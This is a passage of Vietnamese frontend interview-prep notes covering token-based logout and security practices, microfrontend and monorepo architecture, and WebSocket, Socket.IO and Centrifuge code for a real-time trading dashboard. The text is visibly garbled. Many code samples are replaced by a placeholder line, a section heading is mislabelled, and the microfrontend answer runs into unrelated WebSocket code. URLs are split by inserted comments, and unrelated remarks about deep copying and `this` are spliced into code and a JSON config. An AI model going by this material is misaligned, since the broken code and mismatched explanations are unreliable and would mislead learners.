
---

**D. Logout Flow (Đăng Xuất):**

```js
// Ví dụ rút gọn
const example = 42;
```

---

#### **🛡️ 3. Security Best Practices (Thực Hành Bảo Mật)**

**A. Cookie Security:**

```js
// Ví dụ rút gọn
const example = 42;
```

**B. Token Storage:**

```js
// Ví dụ rút gọn
const example = 42;
```

**C. Token Rotation (Xoay Vòng Token):**

```js
// Ví dụ rút gọn
const example = 42;
```

---

#### **🔒 4. Special Cases (Các Trường Hợp Đặc Biệt)**

**A. Concurrent Requests (Nhiều Request Cùng Lúc):**

```js
// Ví dụ rút gọn
const example = 42;
```

**B. Inactivity Timeout (Tự Động Logout Khi Không Hoạt Động):**

```js
// Ví dụ rút gọn
const example = 42;
```

**C. Device Fingerprinting (Nhận Diện Thiết Bị):**

```js
// Ví dụ rút gọn
const example = 42;
```

**D. Logout All Devices (Đăng Xuất Tất Cả Thiết Bị):**

```js
// Ví dụ rút gọn
const example = 42;
```

---

#### **⚠️ 5. Common Security Mistakes (Lỗi Bảo Mật Thường Gặp)**

```js
// Ví dụ rút gọn
const example = 42;
```

---

#### **📊 6. Complete Flow Diagram**

```js
// Ví dụ rút gọn
const example = 42;
```

---

#### **💡 Summary (Tóm Tắt)**

**Access Token 🔑**
- **15 phút**, lưu **memory**, dùng gọi API
- Mất khi refresh page → re-fetch từ refresh token

**Refresh Token 🔄**
- **30 ngày**, lưu **httpOnly cookie**, dùng lấy access token
- Secure: httpOnly + Secure + SameSite=Strict

**Best Practices 🛡️**
- ✅ Never localStorage (XSS risk)
- ✅ httpOnly cookie cho refresh token
- ✅ Short-lived access token (15 phút)
- ✅ Token rotation (refresh → new token)
- ✅ Revoke tokens khi logout
- ✅ Rate limiting
- ✅ Inactivity timeout (5-10 phút)
- ✅ Device fingerprinting
- ✅ Audit logging

**Khi Nào Logout:**
- User click logout ✅
- Inactivity > 5 phút ✅
- Refresh token expired ✅
- Suspicious activity detected ✅
- User change password ✅
- Admin revoke access ✅

**Khi Nào Giữ Session:**
- User đang hoạt động (reset timer)
- Refresh token còn valid
- Device trusted
- No security alerts

**Key Takeaway:**
- **Banking/Trading** yêu cầu bảo mật CỰC CAO
- **2 tokens** (access + refresh) = balance giữa UX và security
- **httpOnly cookie** = chống XSS
- **Short-lived tokens** = giảm impact khi leak
- **Audit logging** = detect suspicious activities
- **Multi-factor** everything (MFA, device fingerprint, inactivity timeout)
---

## 47. Q47: 🧱 Q44: Microfrontend & Monorepo - Module Federation, Multi-Framework, Communication Patterns

### P1: Tên câu hỏi: 🧱 Q44: Microfrontend & Monorepo - Module Federation, Multi-Framework, Communication Patterns

### P2: Trả lời (Senior):

## 48. Q48: **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**

### **🎯 Câu Trả Lời Ngắn Gọn (3-4 phút):**

**"Microfrontend = chia app lớn thành nhiều apps nhỏ độc lập. Module Federation = runtime integration (share code, no rebuild).**

**🏗️ Microfrontend Architecture:**
- **Concept**: Mỗi team sở hữu 1 microfrontend (MFE) → deploy độc lập → tech stack riêng.
- **Runtime Integration**: MFEs load at runtime (không phải build time) → independent releases.
- **Shell App (Host)**: Container app load remote MFEs.

**🔧 Module Federation (Webpack 5 / Vite):**
- **Expose**: MFE expose components/modules.

```js
// Ví dụ rút gọn
const example = 42;
```

- **Consume**: Host import remote modules.

```js
// Ví dụ rút gọn
const example = 42;
```

- **Shared Dependencies**: Share React, libraries → load once (not duplicate).

```js
// Ví dụ rút gọn
const example = 42;
```

**♻️ Communication Patterns:**
1. **Props/Callbacks**: Parent pass props to child MFE → simple, tightly coupled.
2. **Custom Events**: `window.dispatchEvent()` → loose coupling.
3. **State Management**: Shared Zustand/Redux store → sync state across MFEs.
4. **PubSub**: Event bus (RxJS) → publish/subscribe pattern.

**🎯 Multi-Framework Support:**
- **React + Vue + Angular**: Mỗi MFE dùng framework khác nhau.
- **Web Components**: Wrap MFEs trong custom elements → framework-agnostic.

```js
// Ví dụ rút gọn
const example = 42;
```

**🔑 Monorepo (Nx / Turborepo):**
- **Concept**: 1 repo chứa multiple projects → shared tooling, dependencies.
- **Benefits**:
- Atomic commits across projects.
- Shared libraries, utilities.
- Consistent tooling (ESLint, Prettier, TypeScript configs).
- Dependency graph → build chỉ affected projects.
- **Tools**: Nx (Angular ecosystem), Turborepo (Vercel), Lerna (legacy).

**⚠️ Trade-offs:**

| Aspect | Monolith | Microfrontend |
|--------|----------|---------------|
| **Complexity** | Low | High (orchestration, communication) |
| **Build Time** | Slow (1 large app) | Fast (parallel builds) |
| **Deploy** | All-or-nothing | Independent per MFE |
| **Team Autonomy** | Low (shared codebase) | High (own tech stack) |
| **Bundle Size** | Optimized | Risk of duplication |
| **Developer Experience** | Simple | Complex (tooling, debugging) |

**💡 Senior Insights:**
- **When to use MFE**: Large teams (10+ devs), independent releases critical, different domains (e-commerce: catalog, checkout, profile).
- **When NOT to use**: Small teams, simple apps, tight coupling between features.
- **Module Federation vs Iframe**: MF = shared dependencies, better performance. Iframe = total isolation but clunky UX.
- **Styling Isolation**: CSS Modules, Shadow DOM, CSS-in-JS (styled-components) → prevent style conflicts.
- **Routing**: Each MFE handle own routes + Shell sync URL state.

**🚀 Real-World Example (E-commerce):**

```js
// Ví dụ rút gọn
const example = 42;
```

- Team A deploy catalog update → không ảnh hưởng Teams B, C, D.
- Shared: React, UI library (button, input) via Module Federation.

---

**❓ Câu Hỏi:**

Giải thích chi tiết kiến trúc Microfrontend và Monorepo, bao gồm Module Federation (Webpack/Vite), Multi-framework development, Communication patterns, Routing strategies, và Styling isolation. Phân tích ưu nhược điểm và ứng dụng thực tế.

**📚 Phần 1: Khái Niệm Cơ Bản (Core Concepts)**

#### **💡 Microfrontend Là Gì? (What is Microfrontend?)**

**Microfrontend** là kiến trúc chia ứng dụng frontend lớn thành **nhiều ứng dụng nhỏ độc lập**, mỗi ứng dụng:
- ✅ Được phát triển bởi **team riêng** (độc lập)
- ✅ Deploy **riêng biệt** (independent deployment)
- ✅ Có **technology stack riêng** (React, Vue, Angular, etc.)
- ✅ **Runtime integration** (ghép nối lúc runtime, không phải build time)

---

#### **🔥 Tại Sao Cần Microfrontend? (Why Microfrontend?)**

**💔 Vấn Đề Của Monolithic Frontend (The Problem):**

```js
// Ví dụ rút gọn
const example = 42;
```

**❌ Vấn Đề 1: DEPLOYMENT HELL (Địa Ngục Deploy)**

```js
// Ví dụ rút gọn
const example = 42;
```

**❌ Vấn Đề 2: TEAM CONFLICTS (Xung Đột Giữa Teams)**

```js
// Ví dụ rút gọn
const example = 42;
```

**❌ Vấn Đề 3: SLOW BUILD TIME (Build Chậm)**

```js
// Ví dụ rút gọn
const example = 42;
```

**❌ Vấn Đề 4: MERGE CONFLICTS (Xung Đột Merge)**

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
// ❌ REST API Polling - KHÔNG hiệu quả
setInterval(() => {
  fetch('/api/market-data')
    .then(res => res.json())
    .then(data => updateUI(data));
}, 1000); // Call API mỗi giây!

/**
 * VẤN ĐỀ:
 * - Tốn băng thông: Mỗi request = headers + body
 * - Latency cao: HTTP handshake mỗi lần
 * - Server load cao: 1000 clients = 1000 requests/giây
 * - Không real-time: Delay tối thiểu 1 giây
 * - Waste resources: Poll ngay cả khi không có data mới
 */

// ✅ WebSocket - Real-time hiệu quả
const ws = new WebSocket('wss: // Chú giải: market-data.example.com');

ws.onopen = () => {
  console.log('✅ Connected');
 // Chú giải: Subscribe to channels
  ws.send(JSON.stringify({
    type: 'subscribe',
    symbols: ['VNM', 'HPG', 'VIC']
  }));
};

ws.onmessage = (event) => {
  const data = JSON.parse(event.data);
  updateUI(data); // ⚡ Update ngay khi có data mới
};

/**
 * ƯU ĐIỂM:
 * ✅ Persistent connection: Kết nối 1 lần, dùng mãi
 * ✅ Push data ngay lập tức: Latency < 10ms
 * ✅ Tiết kiệm băng thông: Không có HTTP headers lặp lại
 * ✅ Server load thấp: Chỉ push khi có data mới
 * ✅ True real-time: Không có polling delay
 */

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: 1. CONNECTING (readyState = 0)
const ws = new WebSocket('wss: // Chú giải: api.example.com/stream');
console.log('State:', ws.readyState); // Chú giải: 0 - CONNECTING

 // Chú giải: 2. OPEN (readyState = 1)
ws.onopen = () => {
  console.log('State:', ws.readyState); // Chú giải: 1 - OPEN
  console.log('✅ Connected, có thể gửi message');

 // Chú giải: Send subscribe message
  ws.send(JSON.stringify({
    type: 'subscribe',
    symbols: ['BTCUSDT', 'ETHUSDT']
  }));
};

 // Chú giải: 3. MESSAGE - Nhận data từ server
ws.onmessage = (event: MessageEvent) => {
  const data = JSON.parse(event.data);
  console.log('📥 Received:', data);

 // Chú giải: Update UI
  updateTickerPrice(data.symbol, data.price);
};

// 4. ERROR - Xử lý lỗi
ws.onerror = (error) => {
  console.error('❌ WebSocket error:', error);
  showNotification('Connection error. Retrying...');
};

 // Chú giải: 5. CLOSE (readyState = 3)
ws.onclose = (event: CloseEvent) => {
  console.log('State:', ws.readyState); // Chú giải: 3 - CLOSED
  console.log('Code:', event.code);
  console.log('Reason:', event.reason);

  /**
   * CLOSE CODES:
   * 1000: Normal closure
   * 1001: Going away (page refresh)
   * 1006: Abnormal closure (no close frame)
   * 1008: Policy violation (auth error)
   * 1011: Server error
   */

 // Chú giải: Reconnect logic
  if (shouldReconnect(event.code)) {
    scheduleReconnect();
  }
};

 // Chú giải: Cleanup khi unmount
useEffect(() => {
  const ws = new WebSocket(url);

  return () => {
    ws.close(1000, 'Component unmounted'); // Chú giải: ✅ Clean close
  };
}, [url]);

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
/**
 * PROBLEM: Multiple components subscribe to same symbol
 *
 * Component A: Subscribe VNM
 * Component B: Subscribe VNM
 * Component C: Subscribe HPG
 *
 * ❌ BAD: 3 WebSocket connections (waste resources)
 * ✅ GOOD: 1 connection, reference counting
 */

interface SubscriptionTracker {
  subscriptions: Map<string, {
    count: number;
    subscribers: Set<string>;
  }>;
}

class LiveDataManager {
  private ws: WebSocket | null = null;
  private tracker = new Map<string, { count: number; subscribers: Set<string> }>();

  subscribe(symbols: string[], componentId: string) {
    symbols.forEach(symbol => {
      const current = this.tracker.get(symbol);

      if (!current) {
 // Chú giải: 🔥 First subscriber → Send subscribe message
        this.tracker.set(symbol, {
          count: 1,
          subscribers: new Set([componentId])
        });

        this.ws?.send(JSON.stringify({
          type: 'subscribe',
          symbol
        }));
      } else {
 // Chú giải: ⚡ Already subscribed → Just increment counter
        current.count++;
        current.subscribers.add(componentId);

        // Không gửi subscribe message nữa!
      }
    });

    return componentId;
  }

  unsubscribe(componentId: string) {
    this.tracker.forEach((data, symbol) => {
      if (data.subscribers.has(componentId)) {
        data.subscribers.delete(componentId);
        data.count--;

        if (data.count === 0) {
 // Chú giải: 🗑️ No more subscribers → Unsubscribe
          this.tracker.delete(symbol);

          this.ws?.send(JSON.stringify({
            type: 'unsubscribe',
            symbol
          }));
        }
      }
    });
  }
}

/**
 * TIMELINE EXAMPLE:
 *
 * Time | Event                    | VNM count | Action
 * -----|--------------------------|-----------|------------------
 * T0   | Component A mounts       | 0 → 1     | ✅ Send subscribe
 * T1   | Component B mounts       | 1 → 2     | ⚡ Reuse connection
 * T2   | Component C mounts       | 2 → 3     | ⚡ Reuse connection
 * T3   | Component A unmounts     | 3 → 2     | ✋ Keep connection
 * T4   | Component B unmounts     | 2 → 1     | ✋ Keep connection
 * T5   | Component C unmounts     | 1 → 0     | 🗑️ Unsubscribe, close
 */

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: File: lib/live-data-manager/stores/useLiveDataStore.ts

interface TickerData {
  symbol: string;
  lastPrice: number;
  change: number;
  volume: number;
  timestamp: number;
}

interface LiveDataStore {
  tickerData: Record<string, TickerData>;
  updateTickerData: (data: TickerData) => void;
  batchUpdate: (updates: TickerData[]) => void;
}

const useLiveDataStore = create<LiveDataStore>((set) => ({
  tickerData: {},

 // Chú giải: Update single ticker
  updateTickerData: (data) => set((state) => ({
    tickerData: {
      ...state.tickerData,
      [data.symbol]: data
    }
  })),

 // Hiệu suất: tránh chặn main thread; dùng Web Worker, chia nhỏ tác vụ, tối ưu reflow/repaint.
  batchUpdate: (updates) => set((state) => {
    const newData = { ...state.tickerData };
    updates.forEach(data => {
      newData[data.symbol] = data;
    });
    return { tickerData: newData };
  })
}));

 // Chú giải: WebSocket message handler
ws.onmessage = (event) => {
  const data = JSON.parse(event.data);

  if (Array.isArray(data)) {
 // Chú giải: Batch update
    useLiveDataStore.getState().batchUpdate(data);
  } else {
 // Chú giải: Single update
    useLiveDataStore.getState().updateTickerData(data);
  }
};

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: File: lib/live-data-manager/hooks/useLiveMarketData.ts

const useLiveMarketData = () => {
  const wsRef = useRef<WebSocket | null>(null);
  const updateStore = useLiveDataStore(state => state.updateTickerData);

  useEffect(() => {
    const ws = new WebSocket('wss: // Chú giải: market.example.com/stream');
    wsRef.current = ws;

    ws.onopen = () => {
      console.log('✅ WebSocket connected');
 // Chú giải: Re-subscribe to active symbols after reconnect
      const activeSymbols = getActiveSubscriptions();
      if (activeSymbols.length > 0) {
        ws.send(JSON.stringify({
          type: 'subscribe',
          symbols: activeSymbols
        }));
      }
    };

    ws.onmessage = (event) => {
      const data = JSON.parse(event.data);
      updateStore(data); // Chú giải: Update Zustand store
    };

    ws.onerror = (error) => {
      console.error('❌ WebSocket error:', error);
    };

    ws.onclose = (event) => {
      console.log('🔌 WebSocket closed:', event.code);
 // Chú giải: Auto-reconnect
      if (shouldReconnect(event.code)) {
        setTimeout(() => {
          console.log('🔄 Reconnecting...');
 // Chú giải: Re-run effect to reconnect
        }, getReconnectDelay());
      }
    };

    return () => {
      ws.close(1000, 'Component cleanup');
    };
  }, []);

  return wsRef;
};

 // Chú giải: Component usage
const StockWatchlist = () => {
 // Chú giải: Initialize WebSocket manager
  useLiveMarketData();

 // Chú giải: Subscribe to symbols
  useSubscribeTickers('ticker', ['VNM', 'HPG', 'VIC']);

 // Chú giải: Get data from store (selective subscription)
  const tickerData = useLiveDataStore(
    state => state.tickerData,
    shallow // Shallow compare để avoid unnecessary re-renders
  );

  return (
    <div>
      {Object.entries(tickerData).map(([symbol, data]) => (
        <StockRow key={symbol} symbol={symbol} data={data} />
      ))}
    </div>
  );
};

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
/**
 * PROBLEM: Nhận 1000 updates/giây từ WebSocket
 * SOLUTION: Throttle UI updates với requestAnimationFrame (60fps)
 */

const useThrottledWebSocket = () => {
  const [data, setData] = useState<TickerData | null>(null);
  const latestDataRef = useRef<TickerData | null>(null);
  const rafIdRef = useRef<number | null>(null);

  // Update UI loop - chạy tối đa 60fps
  const updateUI = useCallback(() => {
    if (latestDataRef.current) {
      setData(latestDataRef.current); // Chú giải: Update state
      latestDataRef.current = null; // Chú giải: Clear
    }
    rafIdRef.current = requestAnimationFrame(updateUI);
  }, []);

  useEffect(() => {
 // Chú giải: Start animation loop
    rafIdRef.current = requestAnimationFrame(updateUI);

    return () => {
      if (rafIdRef.current) {
        cancelAnimationFrame(rafIdRef.current);
      }
    };
  }, [updateUI]);

 // Chú giải: WebSocket message handler
  const onMessage = useCallback((event: MessageEvent) => {
    const parsed = JSON.parse(event.data);

    // ⚡ Chỉ store data, KHÔNG update state ngay
    // Đợi RAF cycle tiếp theo
    latestDataRef.current = parsed;
  }, []);

  return { data, onMessage };
};

/**
 * RESULT:
 * ❌ Before: 1000 updates/giây → Lag UI, high CPU
 * ✅ After: 60 updates/giây → Smooth, low CPU
 */

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: ❌ BAD: Update entire store → All components re-render
const useLiveDataStore = create((set) => ({
  tickers: {},
  updateAll: (newTickers) => set({ tickers: newTickers })
  // Tất cả components subscribe tickers sẽ re-render!
}));

 // Chú giải: ✅ GOOD: Selective update + selector
const useLiveDataStore = create((set) => ({
  tickers: {},
  updateTicker: (symbol, data) => set((state) => ({
    tickers: {
      ...state.tickers,
      [symbol]: data // Chú giải: Chỉ update 1 symbol
    }
  }))
}));

// Component chỉ subscribe symbol mình cần
const StockRow = ({ symbol }) => {
  const data = useLiveDataStore(
    state => state.tickers[symbol], // Chú giải: ⚡ Selector - chỉ lấy 1 symbol
    shallow // Sao chép nông: chỉ sao chép thuộc tính cấp trên; object lồng bên trong vẫn giữ tham chiếu chung.
  );

  // ✅ Chỉ re-render khi symbol này update
  // ❌ Không re-render khi symbols khác update
};

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: ❌ BAD: Render all 1000 rows
const Watchlist = ({ data }) => {
  return data.map(item => <StockRow data={item} />);
 // Chú giải: 1000 DOM nodes → Slow render, high memory
};

 // Chú giải: ✅ GOOD: Virtual scrolling with AG Grid
import { AgGridReact } from 'ag-grid-react';

const Watchlist = ({ data }) => {
  const columnDefs = useMemo(() => [
    { field: 'symbol', headerName: 'Symbol' },
    { field: 'lastPrice', headerName: 'Price' },
    { field: 'change', headerName: 'Change' }
  ], []);

  return (
    <AgGridReact
      rowData={data}
      columnDefs={columnDefs}
      // AG Grid tự động dùng virtual scrolling
      // Chỉ render ~20 visible rows thay vì 1000
    />
  );
};

/**
 * PERFORMANCE:
 * ❌ No virtual scrolling: 1000 rows → 500ms render
 * ✅ Virtual scrolling: 20 rows → 16ms render (60fps)
 */

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: ❌ BAD: Update từng ticker một
ws.onmessage = (event) => {
  const data = JSON.parse(event.data);
  updateTicker(data.symbol, data); // Chú giải: 100 calls → 100 re-renders
};

 // Chú giải: ✅ GOOD: Batch updates
let batchQueue: TickerData[] = [];
let batchTimer: NodeJS.Timeout | null = null;

ws.onmessage = (event) => {
  const data = JSON.parse(event.data);
  batchQueue.push(data);

  if (!batchTimer) {
    batchTimer = setTimeout(() => {
 // Chú giải: Batch update after 16ms (60fps)
      batchUpdateTickers(batchQueue);
      batchQueue = [];
      batchTimer = null;
    }, 16);
  }
};

 // Chú giải: 100 updates → 1 batch update → 1 re-render

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
class ResilientWebSocket {
  private ws: WebSocket | null = null;
  private url: string;
  private reconnectAttempts = 0;
  private maxAttempts = 5;
  private baseDelay = 1000; // Chú giải: 1 second
  private activeSubscriptions: string[] = [];

  constructor(url: string) {
    this.url = url;
    this.connect();
  }

  connect() {
    try {
      this.ws = new WebSocket(this.url);

      this.ws.onopen = () => {
        console.log('✅ Connected');
        this.reconnectAttempts = 0; // Chú giải: Reset counter

 // Chú giải: Re-subscribe to previous channels
        this.resubscribeAll();
      };

      this.ws.onmessage = this.handleMessage.bind(this);

      this.ws.onerror = (error) => {
        console.error('❌ WebSocket error:', error);
      };

      this.ws.onclose = (event) => {
        console.log(`🔌 Closed: ${event.code} - ${event.reason}`);

        if (this.shouldReconnect(event.code)) {
          this.scheduleReconnect();
        } else {
          this.notifyUser('Connection closed. Please refresh.');
        }
      };
    } catch (error) {
      console.error('Failed to create WebSocket:', error);
      this.scheduleReconnect();
    }
  }

  private shouldReconnect(code: number): boolean {
 // Chú giải: Normal closure or auth errors → Don't reconnect
    if (code === 1000 || code === 1008) return false;

 // Chú giải: Max attempts reached
    if (this.reconnectAttempts >= this.maxAttempts) {
      console.error('❌ Max reconnection attempts reached');
      return false;
    }

    return true;
  }

  private scheduleReconnect() {
 // Chú giải: Exponential backoff: 1s, 2s, 4s, 8s, 16s
    const delay = this.baseDelay * Math.pow(2, this.reconnectAttempts);

    console.log(
      `🔄 Reconnecting in ${delay}ms (attempt ${this.reconnectAttempts + 1}/${this.maxAttempts})`
    );

    setTimeout(() => {
      this.reconnectAttempts++;
      this.connect();
    }, delay);
  }

  private resubscribeAll() {
    if (this.activeSubscriptions.length > 0) {
      this.ws?.send(JSON.stringify({
        type: 'subscribe',
        symbols: this.activeSubscriptions
      }));
    }
  }

  subscribe(symbols: string[]) {
    this.activeSubscriptions = [...new Set([...this.activeSubscriptions, ...symbols])];

    if (this.ws?.readyState === WebSocket.OPEN) {
      this.ws.send(JSON.stringify({
        type: 'subscribe',
        symbols
      }));
    }
  }

  private handleMessage(event: MessageEvent) {
    const data = JSON.parse(event.data);
 // Chú giải: Process message
  }

  close() {
    this.ws?.close(1000, 'Normal closure');
  }
}

/**
 * RECONNECTION TIMELINE:
 *
 * T0: Connection lost
 * T0 + 1s: Attempt 1 (baseDelay * 2^0)
 * T0 + 3s: Attempt 2 (baseDelay * 2^1 = 2s)
 * T0 + 7s: Attempt 3 (baseDelay * 2^2 = 4s)
 * T0 + 15s: Attempt 4 (baseDelay * 2^3 = 8s)
 * T0 + 31s: Attempt 5 (baseDelay * 2^4 = 16s) - Final
 */

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
const ConnectionStatus = () => {
  const [status, setStatus] = useState<'connected' | 'connecting' | 'disconnected'>('connecting');
  const [reconnectAttempt, setReconnectAttempt] = useState(0);

  useEffect(() => {
    const ws = getWebSocketInstance();

    const handleOpen = () => {
      setStatus('connected');
      setReconnectAttempt(0);
    };

    const handleClose = () => {
      setStatus('disconnected');
    };

    const handleReconnecting = (attempt: number) => {
      setStatus('connecting');
      setReconnectAttempt(attempt);
    };

    ws.addEventListener('open', handleOpen);
    ws.addEventListener('close', handleClose);
    ws.addEventListener('reconnecting', handleReconnecting);

    return () => {
      ws.removeEventListener('open', handleOpen);
      ws.removeEventListener('close', handleClose);
      ws.removeEventListener('reconnecting', handleReconnecting);
    };
  }, []);

  return (
    <div className={`connection-status ${status}`}>
      {status === 'connected' && (
        <span className="text-green-500">🟢 Connected</span>
      )}
      {status === 'connecting' && (
        <span className="text-yellow-500">
          🟡 Connecting... {reconnectAttempt > 0 && `(Attempt ${reconnectAttempt}/5)`}
        </span>
      )}
      {status === 'disconnected' && (
        <span className="text-red-500">
          🔴 Disconnected
          <button onClick={() => window.location.reload()}>
            Refresh
          </button>
        </span>
      )}
    </div>
  );
};

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
/**
 * SOCKET.IO = WebSocket + Fallback + Rooms + Auto-reconnect + Binary support
 *
 * ✅ Advantages:
 * - Auto-reconnection with exponential backoff
 * - Fallback to HTTP long-polling (IE11, corporate firewalls)
 * - Rooms & Namespaces (multi-tenancy)
 * - Acknowledgements (confirm message received)
 * - Binary support (images, files)
 * - Broadcasting
 *
 * ❌ Disadvantages:
 * - Heavier than native WebSocket (~50KB)
 * - Not compatible with standard WebSocket servers
 * - Requires Socket.IO server
 */

 // Chú giải: Client
import { io } from 'socket.io-client';

const socket = io('https: // Chú giải: api.example.com', {
 // Chú giải: Auto-reconnection
  reconnection: true,
  reconnectionDelay: 1000,
  reconnectionDelayMax: 5000,
  reconnectionAttempts: 5,

 // Chú giải: Timeout
  timeout: 20000,

 // Chú giải: Transports
  transports: ['websocket', 'polling'], // Chú giải: Try WebSocket first, fallback to polling

 // Chú giải: Auth
  auth: {
    token: 'Bearer xyz123'
  }
});

 // Chú giải: ✅ Auto-reconnection
socket.on('connect', () => {
  console.log('✅ Connected:', socket.id);
 // Chú giải: Auto re-subscribe after reconnect
  socket.emit('subscribe', { symbols: ['VNM', 'HPG'] });
});

socket.on('disconnect', (reason) => {
  console.log('🔌 Disconnected:', reason);
 // Chú giải: Socket.IO will auto-reconnect!
});

 // Chú giải: ✅ Rooms - Join specific channels
socket.emit('join-room', 'market-data');

 // Chú giải: ✅ Listen to events
socket.on('ticker-update', (data) => {
  console.log('Ticker update:', data);
});

 // Chú giải: ✅ Acknowledgements
socket.emit('place-order', orderData, (response) => {
  if (response.success) {
    console.log('Order placed:', response.orderId);
  } else {
    console.error('Order failed:', response.error);
  }
});

 // Chú giải: ✅ Binary support
socket.emit('upload-chart', imageBlob);

 // Chú giải: Cleanup
socket.disconnect();

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
import { Server } from 'socket.io';

const io = new Server(3000, {
  cors: {
    origin: 'https: // Chú giải: example.com',
    credentials: true
  }
});

 // Chú giải: Middleware - Authentication
io.use((socket, next) => {
  const token = socket.handshake.auth.token;

  if (isValidToken(token)) {
    next();
  } else {
    next(new Error('Authentication error'));
  }
});

 // Chú giải: Connection
io.on('connection', (socket) => {
  console.log('Client connected:', socket.id);

 // Chú giải: Join room
  socket.on('join-room', (room) => {
    socket.join(room);
    console.log(`${socket.id} joined ${room}`);
  });

 // Chú giải: Subscribe to symbols
  socket.on('subscribe', (data) => {
    const { symbols } = data;

    symbols.forEach((symbol: string) => {
      socket.join(`ticker:${symbol}`);
    });

 // `this` phụ thuộc cách gọi; hàm mũi tên dùng lexical `this` (kế thừa từ scope cha), các hàm thường có `this` thay đổi theo ngữ cảnh.
    socket.emit('subscribed', { symbols });
  });

 // Chú giải: Broadcast ticker updates to room
  setInterval(() => {
    const tickerData = getLatestTicker('VNM');

 // Chú giải: Send to all clients in room
    io.to('ticker:VNM').emit('ticker-update', tickerData);
  }, 1000);

 // Chú giải: Disconnect
  socket.on('disconnect', () => {
    console.log('Client disconnected:', socket.id);
  });
});

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
/**
 * CENTRIFUGE = Real-time messaging platform với horizontal scaling
 *
 * ✅ Advantages:
 * - Horizontal scaling với Redis, KeyDB, Nats
 * - Channel subscription với permissions
 * - Presence (online users tracking)
 * - History (message replay)
 * - Token-based auth với expiration
 * - Binary support
 * - Multiple SDKs (JS, Go, Python, Java...)
 *
 * ❌ Disadvantages:
 * - Complex setup (need Centrifugo server)
 * - Learning curve
 * - Overkill cho small apps
 *
 * 🎯 Use Cases:
 * - Trading platforms (high throughput)
 * - Chat applications (presence, history)
 * - Live dashboards (millions of connections)
 * - Multiplayer games
 */

import Centrifuge from 'centrifuge';

const centrifuge = new Centrifuge('ws: // Chú giải: localhost:8000/connection/websocket', {
 // Chú giải: Token-based auth
  getToken: async () => {
    const response = await fetch('/api/centrifuge-token');
    const { token } = await response.json();
    return token;
  },

 // Chú giải: Auto-resubscribe
  debug: true
});

 // Chú giải: Connect
centrifuge.connect();

 // Chú giải: Subscribe to channel
const subscription = centrifuge.subscribe('market:stocks', {
 // Chú giải: On publish
  publish: (ctx) => {
    console.log('New message:', ctx.data);
    updateTickerData(ctx.data);
  },

 // Chú giải: On subscribe success
  subscribe: (ctx) => {
    console.log('✅ Subscribed to channel');

 // Chú giải: Get presence (online users)
    subscription.presence().then(result => {
      console.log('Online users:', result.clients);
    });

 // Chú giải: Get history (last messages)
    subscription.history({ limit: 100 }).then(result => {
      console.log('Message history:', result.publications);
    });
  },

 // Chú giải: On unsubscribe
  unsubscribe: (ctx) => {
    console.log('🔌 Unsubscribed');
  }
});

 // Chú giải: Publish to channel (server-side)
await subscription.publish({
  symbol: 'VNM',
  price: 85000,
  change: 2.5
});

 // Chú giải: Presence tracking
subscription.on('presence', (ctx) => {
  console.log('User joined:', ctx.info);
});

 // Chú giải: Cleanup
subscription.unsubscribe();
centrifuge.disconnect();

```js
// Ví dụ rút gọn
const example = 42;
```

json
 // Dùng `JSON.parse(JSON.stringify(obj))` là hack sao chép sâu nhưng sẽ mất hàm, `Date`, `undefined`, symbol, v.v.
{
  "v3_use_offset": true,
  "token_hmac_secret_key": "secret-key",
  "api_key": "api-key",
  "admin_password": "admin-password",
  "admin_secret": "admin-secret",
  "namespaces": [
    {
      "name": "market",
      "publish": true,
      "presence": true,
      "history_size": 100,
      "history_ttl": "60s"
    }
  ]
}

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
/**
 * ┌────────────────┬────────────────┬────────────────┬────────────────┐
 * │                │  WEBSOCKET     │  SOCKET.IO     │  CENTRIFUGE    │
 * ├────────────────┼────────────────┼────────────────┼────────────────┤
 * │ Complexity     │ ⭐ Low         │ ⭐⭐ Medium    │ ⭐⭐⭐ High     │
 * │ Size           │ Native         │ ~50KB          │ ~20KB          │
 * │ Auto-reconnect │ ❌ Manual      │ ✅ Built-in    │ ✅ Built-in    │
 * │ Fallback       │ ❌ No          │ ✅ Long-poll   │ ✅ SSE         │
 * │ Rooms          │ ❌ Manual      │ ✅ Built-in    │ ✅ Channels    │
 * │ Scaling        │ ❌ Single      │ ⚠️ Redis       │ ✅ Redis/Nats  │
 * │ Binary         │ ✅ Yes         │ ✅ Yes         │ ✅ Yes         │
 * │ Presence       │ ❌ Manual      │ ⚠️ Custom      │ ✅ Built-in    │
 * │ History        │ ❌ Manual      │ ❌ No          │ ✅ Built-in    │
 * │ Auth           │ ❌ Manual      │ ⚠️ Custom      │ ✅ JWT Token   │
 * │ Server         │ Any WS server  │ Socket.IO srv  │ Centrifugo     │
 * │ Use Case       │ Simple apps    │ Medium apps    │ Enterprise     │
 * └────────────────┴────────────────┴────────────────┴────────────────┘
 *
 * 🎯 DECISION TREE:
 *
 * Simple app, basic real-time (chat, notifications)
 *   → Native WebSocket
 *
 * Need auto-reconnect, rooms, fallback (IE11 support)
 *   → Socket.IO
 *
 * Enterprise, millions of connections, horizontal scaling
 *   → Centrifuge
 *
 * Trading platform, high throughput, low latency
 *   → Centrifuge (with Redis/KeyDB)
 */

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
/**
 * ✅ DO:
 */

 // Chú giải: 1. Always cleanup WebSocket on unmount
useEffect(() => {
  const ws = new WebSocket(url);

  return () => {
    ws.close(1000, 'Component unmounted');
  };
}, []);

 // Tham chiếu: biến chứa địa chỉ tới object trong heap; `const` khóa tham chiếu chứ không khóa nội dung object.
const subscribe = (symbol: string) => {
  refCount[symbol] = (refCount[symbol] || 0) + 1;

  if (refCount[symbol] === 1) {
    ws.send(JSON.stringify({ type: 'subscribe', symbol }));
  }
};

